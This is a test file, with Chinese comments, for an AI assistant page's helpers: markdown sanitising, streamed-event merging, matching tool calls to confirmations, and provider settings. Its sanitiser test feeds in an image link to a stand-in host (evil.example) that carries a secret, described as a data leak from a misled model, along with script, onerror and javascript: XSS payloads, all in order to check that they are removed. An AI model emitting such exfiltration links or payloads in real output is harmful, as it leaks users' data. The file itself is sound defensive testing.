// @vitest-environment happy-dom
/*
 * 钉子：AI 助手页的纯函数。回答的 Markdown 不留图片与脚本（模型被带偏时图片地址能把数据带出去）；
 * 事件按序号归并、重复的不再处理、reset 要重新读会话；工具结果与确认按「运行/调用」对上。
 */
import type { AssistantConfirmation, AssistantEvent, AssistantMessage } from "@/api";
import { describe, expect, it } from "vitest";

import {
  applyEvent,
  argsText,
  chatItems,
  chatStateFrom,
  ASSISTANT_PROVIDERS,
  providerOf,
  renderAnswer,
  renderPartial,
} from "./assistant";

function msg(over: Partial<AssistantMessage>): AssistantMessage {
  return { id: 1, role: "user", content: "", created_at: "2026-10-11T08:00:00Z", ...over };
}

function conf(over: Partial<AssistantConfirmation>): AssistantConfirmation {
  return {
    id: 1,
    run_id: "r1",
    tool_call_id: "c1",
    tool: "pause_torrent",
    summary: "暂停种子：下载器 1，任务 abc",
    arguments: {},
    status: "pending",
    expires_at: "2026-10-11T08:10:00Z",
    created_at: "2026-10-11T08:00:00Z",
    ...over,
  };
}

describe("renderAnswer", () => {
  it("留排版，去掉图片、脚本与事件属性；链接在新标签页打开", () => {
    const html = renderAnswer(
      "**下载器**：\n- qb 在线\n\n![x](https://evil.example/p.png?d=secret)\n<script>alert(1)</script>" +
        '<img src=x onerror="alert(1)">\n[详情](https://example.com)',
    );
    expect(html).toContain("<strong>下载器</strong>");
    expect(html).toContain("<li>qb 在线</li>");
    expect(html).not.toContain("evil.example");
    // 原样 HTML 当成文字显示出来，不成为元素
    const box = document.createElement("div");
    box.innerHTML = html;
    expect(box.querySelectorAll("img, script, iframe, style")).toHaveLength(0);
    for (const el of box.querySelectorAll("*")) {
      for (const a of el.getAttributeNames()) expect(a.startsWith("on")).toBe(false);
    }
    expect(box.textContent).toContain("<script>alert(1)</script>");
    const a = box.querySelector("a")!;
    expect(a.getAttribute("href")).toBe("https://example.com");
    expect(a.getAttribute("target")).toBe("_blank");
    expect(a.getAttribute("rel")).toBe("noopener noreferrer nofollow");
  });

  it("流到一半的「文字 + 换行 + -」不当成标题", () => {
    expect(renderPartial("**结果**：\n-")).not.toContain("<h2");
    expect(renderPartial("**结果**：\n- 第一项")).toContain("<li>");
  });

  it("javascript: 链接不留", () => {
    expect(renderAnswer("[点我](javascript:alert(1))")).not.toContain("javascript:");
  });
});

describe("applyEvent", () => {
  const base = chatStateFrom({
    id: 1,
    title: "t",
    entry: "web",
    running: false,
    created_at: "",
    updated_at: "",
    messages: [msg({ id: 1 })],
    confirmations: [],
    last_seq: 100,
  });

  it("按顺序拼增量；replace 整段替换；回答落库以后清掉进行中的文字", () => {
    let s = applyEvent(base, { seq: 101, type: "run_started", run_id: "r1" })!;
    expect(s.running).toBe(true);
    s = applyEvent(s, { seq: 102, type: "delta", text: "你好" })!;
    s = applyEvent(s, { seq: 103, type: "delta", text: "，世界" })!;
    expect(s.partial).toBe("你好，世界");
    s = applyEvent(s, { seq: 104, type: "delta", text: "全部换掉", replace: true })!;
    expect(s.partial).toBe("全部换掉");
    s = applyEvent(s, {
      seq: 105,
      type: "message",
      message: msg({ id: 2, role: "assistant", content: "最终回答" }),
    })!;
    expect(s.partial).toBe("");
    expect(s.messages.map((m) => m.id)).toEqual([1, 2]);
    s = applyEvent(s, { seq: 106, type: "run_finished", status: "done" })!;
    expect(s.running).toBe(false);
    expect(s.lastSeq).toBe(106);
  });

  it("序号不比 lastSeq 大的事件不再处理（重连时重复送来的）", () => {
    const s = applyEvent(base, { seq: 100, type: "delta", text: "旧的" })!;
    expect(s).toBe(base);
  });

  it("同一条消息、同一个确认按编号更新，不重复", () => {
    let s = applyEvent(base, {
      seq: 101,
      type: "message",
      message: msg({ id: 1, content: "改" }),
    })!;
    expect(s.messages).toHaveLength(1);
    expect(s.messages[0]!.content).toBe("改");
    s = applyEvent(s, { seq: 102, type: "confirmation", confirmation: conf({}) })!;
    s = applyEvent(s, {
      seq: 103,
      type: "confirmation",
      confirmation: conf({ status: "approved" }),
    })!;
    expect(s.confirmations).toHaveLength(1);
    expect(s.confirmations[0]!.status).toBe("approved");
  });

  it("失败时留下原因；reset 要求重新读会话", () => {
    const failed = applyEvent(base, {
      seq: 101,
      type: "run_finished",
      status: "failed",
      error: "模型服务回 401",
    })!;
    expect(failed.error).toBe("模型服务回 401");
    expect(applyEvent(base, { seq: 0, type: "reset", last: 200 } as AssistantEvent)).toBeNull();
  });

  it("工具开始时记下工具，结果回来以后清掉", () => {
    let s = applyEvent(base, {
      seq: 101,
      type: "tool_started",
      tool: { id: "c1", name: "list_tasks", arguments: "{}" },
    })!;
    expect(s.tool?.name).toBe("list_tasks");
    s = applyEvent(s, {
      seq: 102,
      type: "message",
      message: msg({ id: 3, role: "tool", tool_call_id: "c1", run_id: "r1" }),
    })!;
    expect(s.tool).toBeNull();
  });
});

describe("chatItems", () => {
  it("工具结果与确认并进所属的调用，按「运行/调用」对上，编号在两次运行里重复也不串", () => {
    const messages = [
      msg({ id: 1, role: "user", content: "暂停", run_id: "r1" }),
      msg({
        id: 2,
        role: "assistant",
        run_id: "r1",
        tool_calls: [
          { id: "c1", name: "pause_torrent", arguments: '{"task_id":"a"}', write: true },
        ],
      }),
      msg({ id: 3, role: "tool", run_id: "r1", tool_call_id: "c1", content: "第一次" }),
      msg({ id: 4, role: "assistant", run_id: "r1", content: "好了" }),
      msg({ id: 5, role: "user", content: "再暂停", run_id: "r2" }),
      msg({
        id: 6,
        role: "assistant",
        run_id: "r2",
        tool_calls: [
          { id: "c1", name: "pause_torrent", arguments: '{"task_id":"b"}', write: true },
        ],
      }),
      msg({ id: 7, role: "tool", run_id: "r2", tool_call_id: "c1", content: "第二次" }),
      msg({ id: 8, role: "notice", content: "已停止回答。" }),
      msg({ id: 9, role: "assistant", run_id: "r2", content: "" }),
    ];
    const confs = [conf({ id: 1, run_id: "r1" }), conf({ id: 2, run_id: "r2", status: "denied" })];
    const items = chatItems(messages, confs);
    expect(items.map((i) => i.kind)).toEqual([
      "user",
      "assistant",
      "assistant",
      "user",
      "assistant",
      "notice",
    ]);
    const first = items[1]!;
    const second = items[4]!;
    if (first.kind !== "assistant" || second.kind !== "assistant") throw new Error("类型不对");
    expect(first.calls[0]!.result?.content).toBe("第一次");
    expect(first.calls[0]!.confirmation?.id).toBe(1);
    expect(second.calls[0]!.result?.content).toBe("第二次");
    expect(second.calls[0]!.confirmation?.status).toBe("denied");
  });
});

describe("其余", () => {
  it("参数写成一行；空参数写「无参数」", () => {
    expect(argsText('{"downloader_id":1,"task_id":"abc"}')).toBe("downloader_id: 1，task_id: abc");
    expect(argsText("{}")).toBe("无参数");
    expect(argsText("不是 JSON")).toBe("不是 JSON");
  });

  it("不认识的服务商当成「其他」", () => {
    expect(providerOf("deepseek").baseURL).toBe("https://api.deepseek.com");
    expect(providerOf("nope").key).toBe("custom");
    // 有免费额度的两家（M20）：地址与 Groq、Google 的 OpenAI 兼容接口一致，都要代理
    expect(providerOf("groq").baseURL).toBe("https://api.groq.com/openai/v1");
    expect(providerOf("google").baseURL).toBe(
      "https://generativelanguage.googleapis.com/v1beta/openai",
    );
    expect(providerOf("google").needsProxy).toBe(true);
    expect(providerOf("google").privacy).toContain("Google");
    // 要 Key 的服务商都给申请 Key 的 https 页面；预设的常用模型不重复
    for (const p of ASSISTANT_PROVIDERS) {
      if (p.key === "custom" || p.noKey) continue;
      expect(p.consoleURL, p.key).toMatch(/^https:\/\//);
      expect(new Set(p.models).size, p.key).toBe(p.models.length);
    }
  });
});
